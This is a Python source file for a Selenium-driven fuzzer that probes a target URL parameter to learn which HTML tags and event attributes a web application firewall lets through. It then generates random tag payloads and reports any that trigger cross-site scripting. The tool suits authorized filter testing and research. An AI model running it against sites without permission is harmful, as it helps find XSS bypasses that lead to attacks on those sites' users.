from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome import service
from urllib.parse import urlparse
from urllib.parse import urlencode
from language import HTMLTag, HTMLAttribute, HTMLTagAttributeType
from tags import GlobalAttributes, EventsAttributes, TagSpecificAttributes, Tags
from mutations import Mutations
from utils import choice, choice_percent
from threading import Thread, Lock
from scripts import INTERACTION_TRIGGER, ALERT_TRIGGER
from update import install_chromedriver
import logging as log
import argparse
import random
import time

# WAFBypass class


class TagList():
    def __init__(self, e):
        self.l = list(e)

    def __str__(self) -> str:
        s = ""
        for tag in self.l:
            s += f"{tag}"
        return s


class FuzzQueue():
    def __init__(self) -> None:
        self.queue = []
        self.lock = Lock()

    def push(self, tag):
        self.lock.acquire()
        self.queue.append(tag)
        self.lock.release()

    def pop(self):
        if len(self.queue) == 0:
            return None
        self.lock.acquire()
        element = self.queue.pop()
        self.lock.release()
        return element

    def __len__(self):
        return len(self.queue)


class WAFBypass():
    code = ALERT_TRIGGER
    trigger = INTERACTION_TRIGGER

    def __init__(self, opts) -> None:
        self.param = opts.param
        self.options = webdriver.ChromeOptions()
        self.options.add_argument('--no-sandbox')
        if opts.headless:
            self.options.add_argument('--headless')
        self.options.add_argument('--disable-gpu')
        self.options.add_experimental_option(
            "excludeSwitches", ["enable-logging"])
        self.unfiltered_attributes = {}
        self.unfiltered_tags = []
        self.driver = webdriver.Chrome(
            options=self.options,
            service=service.Service(service_args=["--log-path=NUL"]))
        self.url = urlparse(opts.url)
        self.mutator = Mutations()
        self.queue = FuzzQueue()
        self.threads = []
        self.lock = Lock()
        self.payloads = 0

        random.seed(time.time_ns())

        if not self.check_connection():
            raise Exception("Connection Error")

        self.driver.execute_cdp_cmd(
            "Page.addScriptToEvaluateOnNewDocument", {"source": self.code})

    def inc_payloads(self):
        self.lock.acquire()
        self.payloads += 1
        self.lock.release()

    def check_connection(self):
        try:
            self.driver.get(self.url.geturl())
            return True
        except:
            return False

    def wait_for_pageload(self, driver):
        try:
            WebDriverWait(driver, 4).until(
                lambda driver: driver.execute_script("return document.readyState") == "complete")
        except TimeoutError:
            raise Exception("Page Load Error")

    def get_page_title(self):
        return self.driver.title

    @property
    def is_403(self):
        return self.driver.title == "403 Forbidden"

    @property
    def triggered_xss(self):
        return self.driver.execute_script("return window.alert_trigger")

    def navigate(self, driver, url):
        driver.get(url)
        self.wait_for_pageload(driver)

        is403 = False

        if self.is_403:
            is403 = True
        else:
            is403 = False

        triggerxss = self.triggered_xss

        return (is403, triggerxss)

    def identify_unfiltered_attributes(self):
        try:
            self.unfiltered_attributes["global"] = []
            self.unfiltered_attributes["events"] = []
            self.unfiltered_attributes["tag_specific"] = {}

            for attr in GlobalAttributes:
                encoded = urlencode({self.param: f"{attr}"})
                url = f"{self.url.scheme}://{self.url.netloc}/?{encoded}"
                is403, _ = self.navigate(self.driver, url)
                if not is403:
                    self.unfiltered_attributes["global"].append(attr)

            for attr in EventsAttributes:
                encoded = urlencode({self.param: f"{attr}"})
                url = f"{self.url.scheme}://{self.url.netloc}/?{encoded}"
                is403, _ = self.navigate(self.driver, url)
                if not is403:
                    self.unfiltered_attributes["events"].append(attr)

            for tag in self.unfiltered_tags:
                if tag not in self.unfiltered_attributes["tag_specific"]:
                    self.unfiltered_attributes["tag_specific"][tag.name] = []
                try:
                    for attr in TagSpecificAttributes[tag.name]:
                        encoded = urlencode(
                            {self.param: f"<{tag.name} {attr}/>"})
                        url = f"{self.url.scheme}://{self.url.netloc}/?{encoded}"
                        is403, _ = self.navigate(self.driver, url)
                        if not is403:
                            self.unfiltered_attributes["tag_specific"][tag.name].append(
                                attr)
                except KeyError:
                    print(f"Tag {tag.name} not found in TagSpecificAttributes")
        except KeyboardInterrupt:
            return

    def identify_unfiltered_tags(self):
        try:
            for tag in Tags:
                encoded = urlencode({self.param: f"{tag}"})
                url = f"{self.url.scheme}://{self.url.netloc}/?{encoded}"
                is403, _ = self.navigate(self.driver, url)
                if not is403:
                    self.unfiltered_tags.append(tag)
        except KeyboardInterrupt:
            return

    def dry_run(self):
        try:
            self.identify_unfiltered_tags()
            self.identify_unfiltered_attributes()
        except Exception as e:
            raise Exception(f"Dry Run Error: {e}")
        except KeyboardInterrupt:
            return

    def get_tag(self):
        try:
            tag = choice(self.unfiltered_tags)
            # make a copy of tag to avoid mutating the original
            tag = HTMLTag(tag.name, tag.self_closing)
            tag.set_mutator(self.mutator)

            nglobattr = choice(range(1, 3))
            nattr = choice(range(1, 3))

            globals = list(self.unfiltered_attributes["global"])

            for _ in range(0, nglobattr):
                if len(globals) == 0:
                    break
                attr = choice(globals)
                globals.remove(attr)
                # make a copy of attr to avoid mutating the original
                attr = HTMLAttribute(attr.name, attr.kind,
                                     glob=True, root=None)
                tag.add_attribute(attr)

            if len(self.unfiltered_attributes["events"]) == 0:
                raise Exception("No available events found")

            attr = choice(self.unfiltered_attributes["events"])
            # make a copy of attr to avoid mutating the original
            attr = HTMLAttribute(attr.name, attr.kind,
                                 glob=False, root=None)
            tag.add_attribute(attr)

            tag_specific = list(
                self.unfiltered_attributes["tag_specific"][tag.name])

            for _ in range(0, nattr):
                if len(tag_specific) == 0:
                    break
                attr = choice(tag_specific)
                tag_specific.remove(attr)
                # make a copy of attr to avoid mutating the original
                attr = HTMLAttribute(attr.name, attr.kind,
                                     glob=False, root=None)
                tag.add_attribute(attr)

            addchildren = {
                70: lambda: False,
                30: lambda: True
            }

            should_add = choice_percent(addchildren)

            if (should_add()):
                tag.children.append(self.get_tag())

            return tag
        except KeyboardInterrupt:
            return None

    def fuzz_thread(self, driver: webdriver.Chrome, started):
        driver.execute_cdp_cmd(
            "Page.addScriptToEvaluateOnNewDocument", {"source": self.code})

        while not started:
            time.sleep(0.1)
            pass

        while True:
            element = self.queue.pop()
            if not element:
                break
            encoded = urlencode({self.param: f"{element}"})
            url = f"{self.url.scheme}://{self.url.netloc}/?{encoded}"
            is403, triggered = self.navigate(driver, url)

        # close window
        driver.close()

    def get_tag_id(self, tag):
        tag_ids = []
        tag_ids.append(tag.id)
        if len(tag.children) >= 0:
            for child in tag.children:
                tag_ids.extend(self.get_tag_id(child))

        return tag_ids

    def get_tag_name(self, tag):
        tag_names = []
        tag_names.append(tag.nameattr)
        if len(tag.children) >= 0:
            for child in tag.children:
                tag_names.extend(self.get_tag_name(child))

        return tag_names

    def get_ids(self, tags):
        tag_ids = []
        for tag in tags:
            tag_ids.extend(self.get_tag_id(tag))
        return tag_ids

    def get_names(self, tags):
        tag_names = []
        for tag in tags:
            tag_names.extend(self.get_tag_name(tag))
        return tag_names

    def populate_ids_names(self, tags):
        ids = self.get_ids(tags)
        names = self.get_names(tags)

        def populate(tag, ids=ids, names=names):
            tag.ids = ids
            tag.names = names
            for child in tag.children:
                populate(child)

        for tag in tags:
            populate(tag)

    def test(self):
        try:
            self.dry_run()
            print("Starting fuzzer")
            while True:
                tags = [self.get_tag() for _ in range(0, choice(range(1, 3)))]
                self.populate_ids_names(tags)
                payload = TagList(tags)
                encoded = urlencode({self.param: f"{payload}"})
                url = f"{self.url.scheme}://{self.url.netloc}/?{encoded}"
                is403, triggered = self.navigate(self.driver, url)
                if triggered:
                    print(f"XSS Payload: {payload}")
                self.driver.execute_script(
                    self.trigger.format(self.get_ids(tags)))
                triggered = self.triggered_xss
                if triggered:
                    print(f"XSS Payload: {payload}")

        except Exception as e:
            log.error(e)
        except KeyboardInterrupt:
            print("Stopping fuzzer")
            self.driver.close()
            return


def main():
    args = argparse.ArgumentParser()
    # mutually exclusive group
    group = args.add_mutually_exclusive_group(required=True)
    group.add_argument("--url", help="URL to test", type=str)
    group.add_argument("--update-chromedriver",
                       help="Update chromedriver to latest version", action="store_true", default=False)
    args.add_argument("--param", help="Parameter to test",
                      type=str)
    args.add_argument("--headless", help="Run in headless mode",
                      action="store_true", default=False)
    arguments = args.parse_args()

    if arguments.update_chromedriver:
        install_chromedriver()
    else:
        if arguments.param is None:
            log.error("Parameter not specified")
            return
        w = WAFBypass(arguments)
        w.test()


if __name__ == "__main__":
    main()
